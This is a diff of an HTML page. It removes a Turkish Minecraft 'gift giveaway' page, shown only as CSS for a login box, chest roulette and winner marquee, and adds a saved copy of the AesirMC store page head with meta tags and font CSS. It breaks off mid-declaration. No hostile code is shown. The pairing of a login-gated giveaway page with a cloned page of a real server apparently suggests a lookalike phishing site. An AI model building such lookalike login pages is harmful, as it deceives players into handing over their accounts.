@@ -1,125 +1,918 @@
 <!DOCTYPE html>
-<html lang="tr">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>AESİR | Minecraft Hediye Dağıtımı</title>
-    <link href="https://fonts.googleapis.com/css2?family=VT323&display=swap" rel="stylesheet">
-    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
-    <style>
-        :root { --mc-green: #558d2e; --mc-dirt: #795548; --mc-dark: #1e1e1e; }
-        body { background-color: var(--mc-dark); color: white; font-family: 'VT323', monospace; text-align: center; margin: 0; background-image: linear-gradient(rgba(0,0,0,0.7), rgba(0,0,0,0.7)), url('https://www.transparenttextures.com/patterns/carbon-fibre.png'); }
-        .live-winners { background: var(--mc-green); border-bottom: 4px solid #2d4d1a; padding: 10px; font-size: 20px; overflow: hidden; white-space: nowrap; }
-        .winner-track { display: inline-block; animation: marquee 30s linear infinite; }
-        @keyframes marquee { 0% { transform: translateX(100%); } 100% { transform: translateX(-100%); } }
-        nav { background: var(--mc-dirt); padding: 15px; border-bottom: 5px solid #4e342e; display: flex; justify-content: space-between; align-items: center; }
-        #auth-container { margin: 50px auto; max-width: 400px; background: #c6c6c6; padding: 30px; border: 4px solid #555; border-top-color: #fff; border-left-color: #fff; box-shadow: 10px 10px 0px rgba(0,0,0,0.5); }
-        input { width: 85%; padding: 12px; margin: 10px 0; background: #000; border: 2px solid #555; color: #00ff00; font-family: 'VT323'; font-size: 20px; outline: none; }
-        .btn-mc { background: #7a7a7a; color: white; border: 3px solid #000; border-top-color: #bbb; border-left-color: #bbb; padding: 12px 25px; cursor: pointer; font-size: 24px; font-family: 'VT323'; text-shadow: 2px 2px #333; width: 100%; }
-        .btn-mc:hover { background: var(--mc-green); }
-        #game-container { display: none; padding: 20px; }
-        .mc-chest { width: 150px; cursor: pointer; transition: 0.2s; image-rendering: pixelated; filter: drop-shadow(5px 5px 0px #000); }
-        #roulette-section { display: none; margin-top: 30px; }
-        .roulette-container { position: relative; width: 100%; max-width: 600px; height: 120px; margin: 20px auto; border: 6px solid #373737; background: #8b8b8b; overflow: hidden; }
-        #roulette-strip { display: flex; position: absolute; left: 0; top: 0; height: 100%; align-items: center; }
-        .slot-item { min-width: 100px; height: 100px; display: flex; justify-content: center; align-items: center; border: 2px solid #373737; background: #8b8b8b; margin: 5px; }
-        .slot-item img { width: 64px; image-rendering: pixelated; }
-        #win-popup { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 2000; justify-content: center; align-items: center; flex-direction: column; }
-    </style>
+<!-- saved from url=(0026)https://store.aesirmc.com/ -->
+<html lang="tr"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+	
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta name="author" content="LeaderOS">
+	<link rel="shortcut icon" type="image/x-icon" href="https://store.aesirmc.com/favicon.ico?cache=1775393847">
+	
+	<title>AesirMC - MMORPG Minecraft</title>
+	<meta name="description" content="MMORPG Minecraft Sunucu AesirMC Türkiyeye Faction, Skyblock, Survival sunucuları yapmıştır. RPG temalı Minecraft Sunucusu Olan AesirMC sizi bekliyor.">
+	<link rel="canonical" href="https://store.aesirmc.com/">
+	<meta property="og:type" content="website">
+	<meta property="og:title" content="AesirMC - MMORPG Minecraft">
+	<meta property="og:description" content="MMORPG Minecraft Sunucu AesirMC Türkiyeye Faction, Skyblock, Survival sunucuları yapmıştır. RPG temalı Minecraft Sunucusu Olan AesirMC sizi bekliyor.">
+	<meta property="og:url" content="https://store.aesirmc.com">
+	<meta property="og:site_name" content="AesirMC">
+		
+	<!-- CSRF -->
+	<meta name="csrf-token" content="2f568603318084bf1547ebe43a5c3d474045e5add92e043f293706779f488ce9">
+	<!-- FONTS -->
+    <style type="text/css">@font-face {font-family:Montserrat;font-style:normal;font-weight:300;src:url(/cf-fonts/v/montserrat/5.0.16/vietnamese/wght/normal.woff2);unicode-range:U+0102-0103,U+0110-0111,U+0128-0129,U+0168-0169,U+01A0-01A1,U+01AF-01B0,U+0300-0301,U+0303-0304,U+0308-0309,U+0323,U+0329,U+1EA0-1EF9,U+20AB;font-display:swap;}@font-face {font-family:Montserrat;font-style:normal;font-weight:300;src:url(/cf-fonts/v/montserrat/5.0.16/cyrillic/wght/normal.woff2);unicode-range:U+0301,U+0400-045F,U+0490-0491,U+04B0-04B1,U+2116;font-display:swap;}@font-face {font-family:Montserrat;font-style:normal;font-weight:300;src:url(/cf-fonts/v/montserrat/5.0.16/cyrillic-ext/wght/normal.woff2);unicode-range:U+0460-052F,U+1C80-1C88,U+20B4,U+2DE0-2DFF,U+A640-A69F,U+FE2E-FE2F;font-display:swap;}@font-face {font-family:Montserrat;font-style:normal;font-weight:300;src:url(/cf-fonts/v/montserrat/5.0.16/latin/wght/normal.woff2);unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+2074,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD;font-display:swap;}@font-face {font-family:Montserrat;font-style:normal;font-weight:300;src:url(/cf-fonts/v/montserrat/5.0.16/latin-ext/wght/normal.woff2);unicode-range:U+0100-02AF,U+0304,U+0308,U+0329,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20CF,U+2113,U+2C60-2C7F,U+A720-A7FF;font-display:swap;}@font-face {font-family:Montserrat;font-style:normal;font-weight:400;src:url(/cf-fonts/v/montserrat/5.0.16/cyrillic-ext/wght/normal.woff2);unicode-range:U+0460-052F,U+1C80-1C88,U+20B4,U+2DE0-2DFF,U+A640-A69F,U+FE2E-FE2F;font-display:swap;}@font-face {font-family:Montserrat;font-style:normal;font-weight:400;src:url(/cf-fonts/v/montserrat/5.0.16/cyrillic/wght/normal.woff2);unicode-range:U+0301,U+0400-045F,U+0490-0491,U+04B0-04B1,U+2116;font-display:swap;}@font-face {font-family:Montserrat;font-style:normal;font-weight:400;src:url(/cf-fonts/v/montserrat/5.0.16/latin-ext/wght/normal.woff2);unicode-range:U+0100-02AF,U+0304,U+0308,U+0329,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20CF,U+2113,U+2C60-2C7F,U+A720-A7FF;font-display:swap;}@font-face {font-family:Montserrat;font-style:normal;font-weight:400;src:url(/cf-fonts/v/montserrat/5.0.16/vietnamese/wght/normal.woff2);unicode-range:U+0102-0103,U+0110-0111,U+0128-0129,U+0168-0169,U+01A0-01A1,U+01AF-01B0,U+0300-0301,U+0303-0304,U+0308-0309,U+0323,U+0329,U+1EA0-1EF9,U+20AB;font-display:swap;}@font-face {font-family:Montserrat;font-style:normal;font-weight:400;src:url(/cf-fonts/v/montserrat/5.0.16/latin/wght/normal.woff2);unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+2074,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD;font-display:swap;}@font-face {font-family:Montserrat;font-style:normal;font-weight:500;src:url(/cf-fonts/v/montserrat/5.0.16/latin-ext/wght/normal.woff2);unicode-range:U+0100-02AF,U+0304,U+0308,U+0329,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20CF,U+2113,U+2C60-2C7F,U+A720-A7FF;font-display:swap;}@font-face {font-family:Montserrat;font-style:normal;font-weight:500;src:url(/cf-fonts/v/montserrat/5.0.16/cyrillic/wght/normal.woff2);unicode-range:U+0301,U+0400-045F,U+0490-0491,U+04B0-04B1,U+2116;font-display:swap;}@font-face {font-family:Montserrat;font-style:normal;font-weight:500;src:url(/cf-fonts/v/montserrat/5.0.16/latin/wght/normal.woff2);unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+2074,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD;font-display:swap;}@font-face {font-family:Montserrat;font-style:normal;font-weight:500;src:url(/cf-fonts/v/montserrat/5.0.16/cyrillic-ext/wght/normal.woff2);unicode-range:U+0460-052F,U+1C80-1C88,U+20B4,U+2DE0-2DFF,U+A640-A69F,U+FE2E-FE2F;font-display:swap;}@font-face {font-family:Montserrat;font-style:normal;font-weight:500;src:url(/cf-fonts/v/montserrat/5.0.16/vietnamese/wght/normal.woff2);unicode-range:U+0102-0103,U+0110-0111,U+0128-0129,U+0168-0169,U+01A0-01A1,U+01AF-01B0,U+0300-0301,U+0303-0304,U+0308-0309,U+0323,U+0329,U+1EA0-1EF9,U+20AB;font-display:swap;}@font-face {font-family:Montserrat;font-style:normal;font-weight:600;src:url(/cf-fonts/v/montserrat/5.0.16/cyrillic-ext/wght/normal.woff2);unicode-range:U+0460-052F,U+1C80-1C88,U+20B4,U+2DE0-2DFF,U+A640-A69F,U+FE2E-FE2F;font-display:swap;}@font-face {font-family:Montserrat;font-style:normal;font-weight:600;src:url(/cf-fonts/v/montserrat/5.0.16/cyrillic/wght/normal.woff2);unicode-range:U+0301,U+0400-045F,U+0490-0491,U+04B0-04B1,U+2116;font-display:swap;}@font-face {font-family:Montserrat;font-style:normal;font-weight:600;src:url(/cf-fonts/v/montserrat/5.0.16/latin-ext/wght/normal.woff2);unicode-range:U+0100-02AF,U+0304,U+0308,U+0329,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20CF,U+2113,U+2C60-2C7F,U+A720-A7FF;font-display:swap;}@font-face {font-family:Montserrat;font-style:normal;font-weight:600;src:url(/cf-fonts/v/montserrat/5.0.16/latin/wght/normal.woff2);unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+2074,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD;font-display:swap;}@font-face {font-family:Montserrat;font-style:normal;font-weight:600;src:url(/cf-fonts/v/montserrat/5.0.16/vietnamese/wght/normal.woff2);unicode-range:U+0102-0103,U+0110-0111,U+0128-0129,U+0168-0169,U+01A0-01A1,U+01AF-01B0,U+0300-0301,U+0303-0304,U+0308-0309,U+0323,U+0329,U+1EA0-1EF9,U+20AB;font-display:swap;}@font-face {font-family:Montserrat;font-style:normal;font-weight:700;src:url(/cf-fonts/v/montserrat/5.0.16/vietnamese/wght/normal.woff2);unicode-range:U+0102-0103,U+0110-0111,U+0128-0129,U+0168-0169,U+01A0-01A1,U+01AF-01B0,U+0300-0301,U+0303-0304,U+0308-0309,U+0323,U+0329,U+1EA0-1EF9,U+20AB;font-display:swap;}@font-face {font-family:Montserrat;font-style:normal;font-weight:700;src:url(/cf-fonts/v/montserrat/5.0.16/cyrillic-ext/wght/normal.woff2);unicode-range:U+0460-052F,U+1C80-1C88,U+20B4,U+2DE0-2DFF,U+A640-A69F,U+FE2E-FE2F;font-display:swap;}@font-face {font-family:Montserrat;font-style:normal;font-weight:700;src:url(/cf-fonts/v/montserrat/5.0.16/cyrillic/wght/normal.woff2);unicode-range:U+0301,U+0400-045F,U+0490-0491,U+04B0-04B1,U+2116;font-display:swap;}@font-face {font-family:Montserrat;font-style:normal;font-weight:700;src:url(/cf-fonts/v/montserrat/5.0.16/latin-ext/wght/normal.woff2);unicode-range:U+0100-02AF,U+0304,U+0308,U+0329,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20CF,U+2113,U+2C60-2C7F,U+A720-A7FF;font-display:swap;}@font-face {font-family:Montserrat;font-style:normal;font-weight:700;src:url(/cf-fonts/v/montserrat/5.0.16/latin/wght/normal.woff2);unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+2074,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD;font-display:swap;}@font-face {font-family:Montserrat;font-style:normal;font-weight:800;src:url(/cf-fonts/v/montserrat/5.0.16/latin-ext/wght/normal.woff2);unicode-range:U+0100-02AF,U+0304,U+0308,U+0329,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20CF,U+2113,U+2C60-2C7F,U+A720-A7FF;font-display:swap;}@font-face {font-family:Montserrat;font-style:normal;font-weight:800;src:url(/cf-fonts/v/montserrat/5.0.16/vietnamese/wght/normal.woff2);unicode-range:U+0102-0103,U+0110-0111,U+0128-0129,U+0168-0169,U+01A0-01A1,U+01AF-01B0,U+0300-0301,U+0303-0304,U+0308-0309,U+0323,U+0329,U+1EA0-1EF9,U+20AB;font-display:swap;}@font-face {font-family:Montserrat;font-style:normal;font-weight:800;src:url(/cf-fonts/v/montserrat/5.0.16/latin/wght/normal.woff2);unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+2074,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD;font-display:swap;}@font-face {font-family:Montserrat;font-style:normal;font-weight:800;src:url(/cf-fonts/v/montserrat/5.0.16/cyrillic/wght/normal.woff2);unicode-range:U+0301,U+0400-045F,U+0490-0491,U+04B0-04B1,U+2116;font-display:swap;}@font-face {font-family:Montserrat;font-style:normal;font-weight:800;src:url(/cf-fonts/v/montserrat/5.0.16/cyrillic-ext/wght/normal.woff2);unicode-range:U+0460-052F,U+1C80-1C88,U+20B4,U+2DE0-2DFF,U+A640-A69F,U+FE2E-FE2F;font-display:swap;}@font-face {font-family:Montserrat;font-style:normal;font-weight:900;src:url(/cf-fonts/v/montserrat/5.0.16/latin/wght/normal.woff2);unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+2074,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD;font-display:swap;}@font-face {font-family:Montserrat;font-style:normal;font-weight:900;src:url(/cf-fonts/v/montserrat/5.0.16/latin-ext/wght/normal.woff2);unicode-range:U+0100-02AF,U+0304,U+0308,U+0329,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20CF,U+2113,U+2C60-2C7F,U+A720-A7FF;font-display:swap;}@font-face {font-family:Montserrat;font-style:normal;font-weight:900;src:url(/cf-fonts/v/montserrat/5.0.16/cyrillic/wght/normal.woff2);unicode-range:U+0301,U+0400-045F,U+0490-0491,U+04B0-04B1,U+2116;font-display:swap;}@font-face {font-family:Montserrat;font-style:normal;font-weight:900;src:url(/cf-fonts/v/montserrat/5.0.16/cyrillic-ext/wght/normal.woff2);unicode-range:U+0460-052F,U+1C80-1C88,U+20B4,U+2DE0-2DFF,U+A640-A69F,U+FE2E-FE2F;font-display:swap;}@font-face {font-family:Montserrat;font-style:normal;font-weight:900;src:url(/cf-fonts/v/montserrat/5.0.16/vietnamese/wght/normal.woff2);unicode-range:U+0102-0103,U+0110-0111,U+0128-0129,U+0168-0169,U+01A0-01A1,U+01AF-01B0,U+0300-0301,U+0303-0304,U+0308-0309,U+0323,U+0329,U+1EA0-1EF9,U+20AB;font-display:swap;}@font-face {font-family:Poppins;font-style:normal;font-weight:300;src:url(/cf-fonts/s/poppins/5.0.11/latin/300/normal.woff2);unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+2074,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD;font-display:swap;}@font-face {font-family:Poppins;font-style:normal;font-weight:300;src:url(/cf-fonts/s/poppins/5.0.11/latin-ext/300/normal.woff2);unicode-range:U+0100-02AF,U+0304,U+0308,U+0329,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20CF,U+2113,U+2C60-2C7F,U+A720-A7FF;font-display:swap;}@font-face {font-family:Poppins;font-style:normal;font-weight:300;src:url(/cf-fonts/s/poppins/5.0.11/devanagari/300/normal.woff2);unicode-range:U+0900-097F,U+1CD0-1CF9,U+200C-200D,U+20A8,U+20B9,U+25CC,U+A830-A839,U+A8E0-A8FF;font-display:swap;}@font-face {font-family:Poppins;font-style:normal;font-weight:400;src:url(/cf-fonts/s/poppins/5.0.11/devanagari/400/normal.woff2);unicode-range:U+0900-097F,U+1CD0-1CF9,U+200C-200D,U+20A8,U+20B9,U+25CC,U+A830-A839,U+A8E0-A8FF;font-display:swap;}@font-face {font-family:Poppins;font-style:normal;font-weight:400;src:url(/cf-fonts/s/poppins/5.0.11/latin/400/normal.woff2);unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+2074,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD;font-display:swap;}@font-face {font-family:Poppins;font-style:normal;font-weight:400;src:url(/cf-fonts/s/poppins/5.0.11/latin-ext/400/normal.woff2);unicode-range:U+0100-02AF,U+0304,U+0308,U+0329,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20CF,U+2113,U+2C60-2C7F,U+A720-A7FF;font-display:swap;}@font-face {font-family:Poppins;font-style:normal;font-weight:500;src:url(/cf-fonts/s/poppins/5.0.11/devanagari/500/normal.woff2);unicode-range:U+0900-097F,U+1CD0-1CF9,U+200C-200D,U+20A8,U+20B9,U+25CC,U+A830-A839,U+A8E0-A8FF;font-display:swap;}@font-face {font-family:Poppins;font-style:normal;font-weight:500;src:url(/cf-fonts/s/poppins/5.0.11/latin/500/normal.woff2);unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+2074,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD;font-display:swap;}@font-face {font-family:Poppins;font-style:normal;font-weight:500;src:url(/cf-fonts/s/poppins/5.0.11/latin-ext/500/normal.woff2);unicode-range:U+0100-02AF,U+0304,U+0308,U+0329,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20CF,U+2113,U+2C60-2C7F,U+A720-A7FF;font-display:swap;}@font-face {font-family:Poppins;font-style:normal;font-weight:600;src:url(/cf-fonts/s/poppins/5.0.11/latin/600/normal.woff2);unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+2074,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD;font-display:swap;}@font-face {font-family:Poppins;font-style:normal;font-weight:600;src:url(/cf-fonts/s/poppins/5.0.11/latin-ext/600/normal.woff2);unicode-range:U+0100-02AF,U+0304,U+0308,U+0329,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20CF,U+2113,U+2C60-2C7F,U+A720-A7FF;font-display:swap;}@font-face {font-family:Poppins;font-style:normal;font-weight:600;src:url(/cf-fonts/s/poppins/5.0.11/devanagari/600/normal.woff2);unicode-range:U+0900-097F,U+1CD0-1CF9,U+200C-200D,U+20A8,U+20B9,U+25CC,U+A830-A839,U+A8E0-A8FF;font-display:swap;}@font-face {font-family:Poppins;font-style:normal;font-weight:700;src:url(/cf-fonts/s/poppins/5.0.11/devanagari/700/normal.woff2);unicode-range:U+0900-097F,U+1CD0-1CF9,U+200C-200D,U+20A8,U+20B9,U+25CC,U+A830-A839,U+A8E0-A8FF;font-display:swap;}@font-face {font-family:Poppins;font-style:normal;font-weight:700;src:url(/cf-fonts/s/poppins/5.0.11/latin/700/normal.woff2);unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+2074,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD;font-display:swap;}@font-face {font-family:Poppins;font-style:normal;font-weight:700;src:url(/cf-fonts/s/poppins/5.0.11/latin-ext/700/normal.woff2);unicode-range:U+0100-02AF,U+0304,U+0308,U+0329,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20CF,U+2113,U+2C60-2C7F,U+A720-A7FF;font-display:swap;}@font-face {font-family:Poppins;font-style:normal;font-weight:800;src:url(/cf-fonts/s/poppins/5.0.11/latin-ext/800/normal.woff2);unicode-range:U+0100-02AF,U+0304,U+0308,U+0329,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20CF,U+2113,U+2C60-2C7F,U+A720-A7FF;font-display:swap;}@font-face {font-family:Poppins;font-style:normal;font-weight:800;src:url(/cf-fonts/s/poppins/5.0.11/latin/800/normal.woff2);unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+2074,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD;font-display:swap;}@font-face {font-family:Poppins;font-style:normal;font-weight:800;src:url(/cf-fonts/s/poppins/5.0.11/devanagari/800/normal.woff2);unicode-range:U+0900-097F,U+1CD0-1CF9,U+200C-200D,U+20A8,U+20B9,U+25CC,U+A830-A839,U+A8E0-A8FF;font-display:swap;}@font-face {font-family:Poppins;font-style:normal;font-weight:900;src:url(/cf-fonts/s/poppins/5.0.11/latin-ext/900/normal.woff2);unicode-range:U+0100-02AF,U+0304,U+0308,U+0329,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20CF,U+2113,U+2C60-2C7F,U+A720-A7FF;font-display:swap;}@font-face {font-family:Poppins;font-style:normal;font-weight:900;src:url(/cf-fonts/s/poppins/5.0.11/latin/900/normal.woff2);unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+2074,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD;font-display:swap;}@font-face {font-family:Poppins;font-style:normal;font-weight:900;src:url(/cf-fonts/s/poppins/5.0.11/devanagari/900/normal.woff2);unicode-range:U+0900-097F,U+1CD0-1CF9,U+200C-200D,U+20A8,U+20B9,U+25CC,U+A830-A839,U+A8E0-A8FF;font-display:swap;}</style>
+    <style type="text/css">@font-face {font-family:Averia Sans Libre;font-style:normal;font-weight:400;src:url(/cf-fonts/s/averia-sans-libre/5.0.18/latin/400/normal.woff2);unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+2074,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD;font-display:swap;}@font-face {font-family:Averia Sans Libre;font-style:normal;font-weight:700;src:url(/cf-fonts/s/averia-sans-libre/5.0.18/latin/700/normal.woff2);unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+2074,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD;font-display:swap;}@font-face {font-family:Poppins;font-style:normal;font-weight:400;src:url(/cf-fonts/s/poppins/5.0.11/devanagari/400/normal.woff2);unicode-range:U+0900-097F,U+1CD0-1CF9,U+200C-200D,U+20A8,U+20B9,U+25CC,U+A830-A839,U+A8E0-A8FF;font-display:swap;}@font-face {font-family:Poppins;font-style:normal;font-weight:400;src:url(/cf-fonts/s/poppins/5.0.11/latin-ext/400/normal.woff2);unicode-range:U+0100-02AF,U+0304,U+0308,U+0329,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20CF,U+2113,U+2C60-2C7F,U+A720-A7FF;font-display:swap;}@font-face {font-family:Poppins;font-style:normal;font-weight:400;src:url(/cf-fonts/s/poppins/5.0.11/latin/400/normal.woff2);unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+2074,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD;font-display:swap;}</style>
+    <style type="text/css">@font-face {font-family:Baloo 2;font-style:normal;font-weight:400 800;src:url(/cf-fonts/v/baloo-2/5.0.18/latin-ext/wght/normal.woff2);unicode-range:U+0100-02AF,U+0304,U+0308,U+0329,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20CF,U+2113,U+2C60-2C7F,U+A720-A7FF;font-display:swap;}@font-face {font-family:Baloo 2;font-style:normal;font-weight:400 800;src:url(/cf-fonts/v/baloo-2/5.0.18/vietnamese/wght/normal.woff2);unicode-range:U+0102-0103,U+0110-0111,U+0128-0129,U+0168-0169,U+01A0-01A1,U+01AF-01B0,U+0300-0301,U+0303-0304,U+0308-0309,U+0323,U+0329,U+1EA0-1EF9,U+20AB;font-display:swap;}@font-face {font-family:Baloo 2;font-style:normal;font-weight:400 800;src:url(/cf-fonts/v/baloo-2/5.0.18/latin/wght/normal.woff2);unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+2074,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD;font-display:swap;}@font-face {font-family:Baloo 2;font-style:normal;font-weight:400 800;src:url(/cf-fonts/v/baloo-2/5.0.18/devanagari/wght/normal.woff2);unicode-range:U+0900-097F,U+1CD0-1CF9,U+200C-200D,U+20A8,U+20B9,U+25CC,U+A830-A839,U+A8E0-A8FF;font-display:swap;}@font-face {font-family:Mogra;font-style:normal;font-weight:400;src:url(/cf-fonts/s/mogra/5.0.11/latin/400/normal.woff2);unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+2074,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD;font-display:swap;}@font-face {font-family:Mogra;font-style:normal;font-weight:400;src:url(/cf-fonts/s/mogra/5.0.11/latin-ext/400/normal.woff2);unicode-range:U+0100-02AF,U+0304,U+0308,U+0329,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20CF,U+2113,U+2C60-2C7F,U+A720-A7FF;font-display:swap;}@font-face {font-family:Mogra;font-style:normal;font-weight:400;src:url(/cf-fonts/s/mogra/5.0.11/gujarati/400/normal.woff2);unicode-range:U+0964-0965,U+0A80-0AFF,U+200C-200D,U+20B9,U+25CC,U+A830-A839;font-display:swap;}</style>
+    <link href="./AesirMC - MMORPG Minecraft_files/boldenvan" rel="stylesheet">
+    <style type="text/css">@font-face {font-family:Rubik;font-style:normal;font-weight:300 900;src:url(/cf-fonts/v/rubik/5.0.18/latin/wght/normal.woff2);unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+2074,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD;font-display:swap;}@font-face {font-family:Rubik;font-style:normal;font-weight:300 900;src:url(/cf-fonts/v/rubik/5.0.18/latin-ext/wght/normal.woff2);unicode-range:U+0100-02AF,U+0304,U+0308,U+0329,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20CF,U+2113,U+2C60-2C7F,U+A720-A7FF;font-display:swap;}@font-face {font-family:Rubik;font-style:normal;font-weight:300 900;src:url(/cf-fonts/v/rubik/5.0.18/hebrew/wght/normal.woff2);unicode-range:U+0590-05FF,U+200C-2010,U+20AA,U+25CC,U+FB1D-FB4F;font-display:swap;}@font-face {font-family:Rubik;font-style:normal;font-weight:300 900;src:url(/cf-fonts/v/rubik/5.0.18/cyrillic-ext/wght/normal.woff2);unicode-range:U+0460-052F,U+1C80-1C88,U+20B4,U+2DE0-2DFF,U+A640-A69F,U+FE2E-FE2F;font-display:swap;}@font-face {font-family:Rubik;font-style:normal;font-weight:300 900;src:url(/cf-fonts/v/rubik/5.0.18/cyrillic/wght/normal.woff2);unicode-range:U+0301,U+0400-045F,U+0490-0491,U+04B0-04B1,U+2116;font-display:swap;}@font-face {font-family:Rubik;font-style:normal;font-weight:300 900;src:url(/cf-fonts/v/rubik/5.0.18/arabic/wght/normal.woff2);unicode-range:U+0600-06FF,U+0750-077F,U+0870-088E,U+0890-0891,U+0898-08E1,U+08E3-08FF,U+200C-200E,U+2010-2011,U+204F,U+2E41,U+FB50-FDFF,U+FE70-FE74,U+FE76-FEFC;font-display:swap;}@font-face {font-family:Rubik;font-style:italic;font-weight:300 900;src:url(/cf-fonts/v/rubik/5.0.18/cyrillic/wght/italic.woff2);unicode-range:U+0301,U+0400-045F,U+0490-0491,U+04B0-04B1,U+2116;font-display:swap;}@font-face {font-family:Rubik;font-style:italic;font-weight:300 